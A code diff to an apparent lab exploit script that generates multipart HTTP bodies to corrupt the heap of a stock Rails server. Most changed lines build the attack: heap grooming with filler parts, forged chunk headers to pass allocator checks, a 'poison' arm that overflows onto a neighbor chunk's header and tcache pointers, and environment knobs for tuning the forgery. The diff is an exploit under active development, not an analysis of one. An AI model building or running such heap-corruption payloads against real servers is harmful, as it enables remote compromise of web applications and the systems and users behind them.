@@ -134,9 +134,25 @@ AB = b'text/plain; charset=ASCII-8BIT'
 pattern = (0x250).to_bytes(8, 'little') + (0x90).to_bytes(8, 'little')
 method = b'a' + b'\xdf' * (n - 5) + b'\x00\x00\x51\x02'
 if mode == 'poison':
-    # poison arm: no drain parts (the only pre-upcase 0x410-class alloc is
-    # the _method part's own parse slice); f filler keeps the geometry tail
-    parts = [part(b'_method', method, b'text/plain; charset=ISO-8859-1')]
+    # poison arm: sub-embed-floor filler parts before _method provide pure
+    # object pressure (zero big mallocs, zero pool consumption) so the
+    # young-generation sweep of the PREVIOUS plant request's params fires
+    # mid-parse, freeing the planted chunks into tcache[0x410]/unsorted
+    # before the upcase; the f filler keeps the geometry tail
+    parts = []
+    for grp in os.environ.get('FILLER_SPEC', '').split(','):
+        if not grp:
+            continue
+        size, count = (int(v, 0) for v in grp.split('x'))
+        for _ in range(count):
+            parts.append(part(f'g{len(parts)}'.encode(), b'g' * size, AB))
+    for grp in os.environ.get('HONEYPOT_SPEC', '').split(','):
+        if not grp:
+            continue
+        size, count = (int(v, 0) for v in grp.split('x'))
+        for _ in range(count):
+            parts.append(part(f'y{len(parts)}'.encode(), b'y' * size, AB))
+    parts.append(part(b'_method', method, b'text/plain; charset=ISO-8859-1'))
 else:
     drain = (pattern * ((1024 + 15) // 16))[:1024]
     parts = [part(f'd{i}'.encode(), drain, AB) for i in range(32)]
@@ -147,26 +163,41 @@ open(f'{ev}/stock-rails-{tag}.attack.body', 'wb').write(
 def p64(v):
     return v.to_bytes(8, 'little')
 def plant_content(size):
-    # content ~1008B: slice AND value both 0x410-class (slice request
-    # max(1024, content+9)); the neighbor chunk's user bytes at +0x40
-    # carry the unsorted-scan forgery (prev_size match + sane next size)
-    # for the grown 0x453 victim; 976B parts feed tcache[0x3f0]
+    # slice AND value are both content-sized max(1024, content+9)-class;
+    # the neighbor chunk's user bytes at +0x30/+0x40 carry the
+    # unsorted-scan forgery (prev_size match + sane next size) for the
+    # grown victim, covering both victim-class variants
     if mode == 'poison':
-        return (b'p' * 0x40 + p64(0x450) + p64(0x91) +
-                b'p' * (size - 0x50))
+        grown = int(os.environ.get('POISON_GROWN', '0x450'), 0)
+        forge = p64(grown) + p64(0x91)
+        # three forge pairs at +0x20/+0x30/+0x40 cover the check qwords
+        # for every victim-class variant
+        return (b'p' * 0x20 + forge * 3 + b'p' * (size - 0x50))
     if size >= 864:
         return (b'p' * 848 + p64(0) + p64(0x91) + b'p' * (size - 864))
     return b'p' * size
-def claim_content(size):
+def claim_content(size, hdr=None, nsize=None):
     if mode == 'poison':
-        # 0x450-class exact-fit claim over the grown 0x453 victim: the
-        # 1081-byte write overshoots the physical 0x410 extent by 49
-        # bytes onto the neighbor's [prev,size] header and tcache
-        # next/key at content offsets 0x408..0x420; the head pair covers
-        # the slice-reuse variant
+        # exact-fit claim over the grown victim: the value write
+        # overshoots the victim's physical extent onto the neighbor's
+        # [prev,size] header and tcache next/key; hdr is the neighbor
+        # user-area offset in the claim content (per-part via
+        # CLAIM_LIST "size@hdr:neigh_size"); the head pair covers the
+        # slice-reuse variant
         head = p64(0x4141414141414141) + p64(0x4242424242424242)
-        return (head + b'Z' * 0x3f8 + p64(0x411) + head +
-                b'Z' * (size - 0x420))
+        base = hdr if hdr is not None else int(
+            os.environ.get('POISON_NEIGH_HDR', '0x410'), 0)
+        ns = nsize if nsize is not None else int(
+            os.environ.get('POISON_NEIGH_SIZE', '0x411'), 0)
+        if base + 0x10 > size:
+            base = size - 0x10
+        c = bytearray(b'Z' * size)
+        c[0:16] = head
+        c[base - 0x10:base - 0x08] = p64(0)
+        c[base - 0x08:base] = p64(ns)
+        c[base:base + 8] = head[:8]
+        c[base + 8:base + 0x10] = head[8:]
+        return bytes(c)
     if size >= 864:
         return (b'Z' * 848 + p64(0) + p64(0x91) + b'Z' * (size - 864))
     return b'Z' * size
@@ -183,8 +214,15 @@ cp = []
 for v in os.environ['CLAIM_LIST'].split(','):
     if not v:
         continue
-    size = int(v, 0)
-    cp.append(part(f'c{len(cp)}'.encode(), claim_content(size), AB))
+    # per-part forge: "size@neigh_hdr:neigh_size" overrides the globals
+    spec = v.split('@', 1)
+    size = int(spec[0], 0)
+    hdr = nsize = None
+    if len(spec) == 2:
+        h, s = spec[1].split(':', 1)
+        hdr, nsize = int(h, 0), int(s, 0)
+    cp.append(part(f'c{len(cp)}'.encode(),
+                   claim_content(size, hdr, nsize), AB))
 open(f'{ev}/stock-rails-{tag}.claim.body', 'wb').write(
     b'\r\n'.join(cp) + b'\r\n--XB--\r\n')
 if mode == 'poison':
@@ -231,7 +269,7 @@ python3 - <<'PY'
 import glob, os, re, sys
 tag = os.environ['TAG']
 n = int(os.environ['N'])
-claim_reqs = {int(v, 0) + 9 for v in os.environ['CLAIM_LIST'].split(',') if v}
+claim_reqs = {int(v.split('@', 1)[0], 0) + 9 for v in os.environ['CLAIM_LIST'].split(',') if v}
 rows = []
 for logf in sorted(glob.glob(f'lab/build/evidence/stock-rails-{tag}-*.server.log'),
                     key=lambda p: int(re.search(r'-(\d+)\.server\.log$', p).group(1))):
